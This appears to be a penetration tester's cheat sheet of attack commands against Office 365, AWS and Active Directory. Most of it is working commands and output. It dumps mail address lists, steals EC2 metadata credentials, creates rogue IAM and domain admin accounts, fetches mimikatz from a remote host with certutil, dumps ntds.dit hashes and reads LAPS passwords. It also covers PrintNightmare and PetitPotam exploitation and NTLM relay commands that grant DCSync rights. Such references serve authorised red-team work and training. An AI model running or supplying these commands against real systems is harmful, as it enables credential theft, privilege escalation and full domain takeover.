---
title: cheat sheets
layout: page
tags: cheatsheet dfir aws privesc o365 ad 
---

## O365

Office365/OWA (MailSniper) - [github repo](http://www.dafthack.com/files/MailSniper-Field-Manual.pdf)

Dump e-mail accounts after first account compromise

```powershell
Import-Module MailSniper.ps1
Get-GlobalAddressList -ExchHostname 'outlook.office365.com' -UserName 'username@domain.com.br' -Password 'Spring2017' -OutFile global-address-list.txt
```
---

## AWS

Convert access keys to console access
https://github.com/NetSPI/aws_consoler

```bash
aws configure
aws sts get-caller-identity     # Get ec2 role name 
aws iam list-attached-role-policies --role-name {role_name}
aws iam get-policy-version --policy-arn {policy_arn} --version-id V1
```

EC2 instances have policies attached to them, we need to first understand their privileges and then move accordly.
```bash
aws sts get-caller-identity
{
    "UserId": "AROA3LQ5G6SYMS7LOLCPH:i-asdasd",
    "Account": "780671579312",
    "Arn": "arn:aws:sts::780671579312:assumed-role"
}
```

Retrieve instance metadata to get aws credentials.
```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
{
  "Code" : "Success",
  "LastUpdated" : "2021-03-24T18:42:47Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "REDACTED",
  "SecretAccessKey" : "REDACTED",
  "Token" : "LQ==",
  "Expiration" : "2021-03-25T00:44:50Z"
}
```

Enumerate policies attached to role
```bash
# 25/03 11:25
ubuntu@ip-10-194-136-21:~$ aws iam list-attached-role-policies --role-name role-name
{
    "AttachedPolicies": [
        {
            "PolicyName": "policy-kms-encryption-security",
            "PolicyArn": "arn:aws:iam::780671579312:policy/policy-kms-encryption-security"
        },
        {
            "PolicyName": "policy-sec-patch-mgmt",
            "PolicyArn": "arn:aws:iam::780671579312:policy/policy-sec-patch-mgmt"
        },
        {
            "PolicyName": "AmazonEC2FullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonEC2FullAccess"
        },
        {
            "PolicyName": "IAMFullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMFullAccess"
        },
        {
            "PolicyName": "AutoScalingFullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AutoScalingFullAccess"
        },
        {
            "PolicyName": "CloudWatchAgentServerPolicy",
            "PolicyArn": "arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy"
        },
        {
            "PolicyName": "AWSElasticBeanstalkWebTier",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSElasticBeanstalkWebTier"
        },
        {
            "PolicyName": "AmazonSSMManagedInstanceCore",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        },
        {
            "PolicyName": "AWSElasticBeanstalkMulticontainerDocker",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSElasticBeanstalkMulticontainerDocker"
        },
        {
            "PolicyName": "AWSElasticBeanstalkWorkerTier",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSElasticBeanstalkWorkerTier"
        }
    ]
}
```

```bash
root@kali:/home/ec2-user# aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "ec2:*",
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": "elasticloadbalancing:*",
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": "cloudwatch:*",
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": "autoscaling:*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2015-02-06T18:40:15+00:00"
    }
}
```

Enumerate privilege of role
```bash
# 25/03 11:29
ubuntu@ip-10-194-136-21:~$ aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMFullAccess --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "iam:*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2015-02-06T18:40:38Z"
    }
}
```

Create new user and add it to the supergroup
```bash
aws iam create-user --user-name aws-admin2
```

List all policies and all groups
```bash
aws iam list-policies
aws iam list-groups
```

```bash
aws iam add-user-to-group --group-name FullAdmins --user-name aws-admin2
```

### EC2 privilege escalation

List keypairs of keys
```bash
aws ec2 describe-key-pairs
```

List instances running
```bash
aws ec2 describe-instances --filters Values=running
```

Attach policy to role
```bash
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name role-ec2
```

Pushes SSH key to instance
```bash
aws ec2-instance-connect send-ssh-public-key \
    --instance-id i-1234567890abcdef0 \
    --instance-os-user ec2-user \
    --availability-zone us-east-2b \
    --ssh-public-key file://path/my-rsa-key.pub
```

PACU

```bash
import_keys <profile-name>

```

---

## AD and Powershell

Powershell mode
```powershell
powershell -Command "$ExecutionContext.SessionState.LanguageMode"
```

Restore deleted objects from Recycle Bin
```powershell
# 1. Check if the feature is enabled
Get-ADOptionalFeature "Recycle Bin Feature" | select-object name, EnabledScopes
# 2. Retrieve AD Object and restore it
Get-ADObject -Filter 'sAMAccountName -eq "DeletedAdmin"' | Restore-ADObject
```

Check user ACLs
```powershell
(Get-ACL "AD:$((Get-ADUser myaccount).distinguishedname)").access
```

Bloodhound ingestor - https://hunter2.gitbook.io/darthsidious/enumeration/bloodhound
```powershell
Invoke-Bloodhound -CollectionMethod All -Compress
```

Check password policy for lockouts
```bat
net accounts
```

Get current domain and domain controller
```powershell
[System.DirectoryServices.ActiveDirectory.Domain].GetCurrentDomain()
```

Search logged on users (From domain joined computer)
```powershell
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client123 # -Server dc01.corp
Get-NetSession -ComputerName dc01
```

List domain users
```powershell
net user /domain
Get-ADUser
```

Powershell prompt in domain context (Useful for bloodhound ingestor from outside a domain-joined box or querying stuff in AD)
```bat
runas /netonly /user:domain\user powershell
```

All Groups that the user belongs to
```powershell
Get-ADPrincipalGroupMembership user | Select name
```
Adding user to domain (Need RSAT module)
```powershell
New-ADUser -Name "Satinha da Silva" -Samusername "sata.silva" -Enabled $True
Add-ADGroupMember -Identity "Domain Admin" -Members "satinha"
```
Creating local user
```powershell
Password = Read-Host -AsSecureString
New-LocalUser "User03" -Password $Password -FullName "Third User" -Description "Description of this account."
# cmd.exe
net user username password /add
net localgroup Administrators username /add
```
Download files from windows
```powershell
certutil.exe -urlcache -split -f http://10.10.10.10/mimikatz.exe mimikatz.exe
IWR -Uri http://asdasd.com.br/file.exe -Outfile file.exe # (Invoke-WebRequest)
```
Remote dump ntds.dit file
```bash
secretsdump.py -just-dc-ntlm domain/user@dc-name.corp 43ad9d72b6fad288056f81166418c3bf
```
Object properties
```powershell
Get-ADObject -SearchBase "DC=corp,DC=local" -filter 'SamAccountName -eq "admin"' -property *
```
Enumerate LDAP distingued names
```bash
ldapsearch -x -h dc-01.corp.local -s base namingcontexts
# And then dumping it
ldapsearch -x -h dc-01.corp.local -b 'DC=corp,DC=local'
```

## LDAP Queries

**Domain attribute**
ms-DS-MachineAccountQuota => amount of computer accounts a user can add to the domain, 0 = disabled
can lead to computer takeover: https://www.youtube.com/watch?v=RUbADHcBLKg
TLDR; if compromise account is member/has privileges of GenericAll in a computer we can change the msDS-AllowedToActOnBehalfOfOtherIdentity property of it, allowing we to generate kerberos tickets that allow us to authenticate on it.

msDS-AllowedToDelegateTo/TrustedToAuthForDelegation

**Interesting ldap attributes**
userPassword
unicodePwd
unixUserPassword
msSFU30Password
os400Password
MS-Mcs-AdmPwd

```powershell
Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd | Where-Object MS-Mcs-AdmPwd -ne $null | FT Name, MS-Mcs-AdmPwd
```

### Domain trusts

(objectClass=trustedDomain)

Enumerate trusted domains

```powershell
PS > nltest.exe /trusted_domains
List of domain trusts:
    0: IDMdomain idm-domain.net (NT 5) (Direct Inbound) ( Attr: foresttrans )
    1: DEVELOPMENT development.net (NT 5) (Direct Inbound)
    2: DOMAIN domain.com (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans external )
    3: aws-us-domain aws-us-domain.net (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    4: aws-sa-domain aws-sa-domain.net (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    5: DOMAIN domain.net (NT 5) (Forest Tree Root) (Primary Domain) (Native)

PS > ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

TopLevelNames            :
ExcludedTopLevelNames    :
TrustedDomainInformation :
SourceName               : domain.net
TargetName               : idmdomain.net
TrustType                : Forest
TrustDirection           : Inbound

TopLevelNames            : {domain.com}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {domain.com}
SourceName               : domain.net
TargetName               : domain.com
TrustType                : Forest
TrustDirection           : Bidirectional

TopLevelNames            : {aws-us-domain.net}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {aws-us-domain.net}
SourceName               : domain.net
TargetName               : aws-us-domain.net
TrustType                : Forest
TrustDirection           : Bidirectional

TopLevelNames            : {aws-sa-domain.net}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {aws-sa-domain.net}
SourceName               : domain.net
TargetName               : aws-sa-domain.net
TrustType                : Forest
TrustDirection           : Bidirectional


ms-ds-machineaccountquota => 
```

## Post-Exploitation / Lateral movement

Quick wins in internal assessments

1. Passwords in SYSVOL / GPP / MS14-025 - `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
2. BloodHound
3. MS14-068 netapi exploit / MS17-010 eternalblue
4. SPN Scanning - `GetUserSPNs.py`
5. mimikatz after elevating privileges
6. [Powershell Remoting + WinRM + AllowUnencrypted](http://blogs.msdn.com/b/powershell/archive/2015/10/27/compromising-yourself-with-winrm-s-allowunencrypted-true.aspx)
7. Kerberoast and ASEPRoasting
8. PrivExchange (Exchange servers)
9. ntds.dat from backup files
10. LLMNR+NBT poisoning
11. IPv6 WPAD poisoning - `mimt6`
12. Cred Dump using procdump (find a way to block mimikatz execution)
13. Resource-based Constrained Delegation
14. [SMB relay](https://bsidescyprus.com/presentations/bsidesCyprus_DropTheMIC.pdf)
15. IPv6 DNS Takeover
16. [PrintNightmare](https://github.com/byt3bl33d3r/ItWasAllADream)
	```bash
	# if command returns something it is vulnerable
	rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
	Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
	Protocol: [MS-RPRN]: Print System Remote Protocol

	# PoC
	git clone https://github.com/byt3bl33d3r/ItWasAllADream; 
	cd ItWasAllADream; sudo docker build -t itwasalladream .
	sudo docker run -it itwasalladream -u user -p password -d domain 10.1.1.1/24
	```
17. [SeriousSAM]()(Requires volume shadow copies enabled)
18. [PetitPotam](https://github.com/topotam/PetitPotam)
	```bash
	# In one pane:
	sudo responder -I eth0 -A

	# weaponizing
	sudo ntlmrelayx.py -t ldap://dc2-domain.com --delegate-acess

	# PoC
	sudo python3 Petitpotam.py attacker-ip dc-ip
```
19. [AD CS (Certificate Services)](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/), exploitation in [[pki-abuse]]
20. Token Impersonation with rubeus
21. Kerberoasting

## Persistence
1. ntds.dit file using secretdump.py
2. Golden ticket
3. [DCSync attacks](https://adsecurity.org/?p=1729)
4. [DCShadown](https://blog.alsid.eu/dcshadow-explained-4510f52fc19d)

## Credential relay

`ntlmrelayx.py` [flags](https://bsidescyprus.com/presentations/bsidesCyprus_DropTheMIC.pdf)

![](/assets/20210727172214.png)

Create domain user and gives DCSync rights
`ntlmrelayx.py -t ldaps://dc1-domain.com --delegate-acess -smb2support --remove-mic`

Create a domain computer account
`ntlmrelayx.py -t ldaps://dc1-domain.com --add-computer -smb2support --remove-mic`

Gives DCSync rights to an existing domain user / computer
`ntlmrelayx.py -t ldaps://dc1-domain.com --escalate-user lowuser/computer -smb2support --remove-mic`


## Aditional info

- [Abusing printers](https://boschko.ca/printer-to-domain-admin/)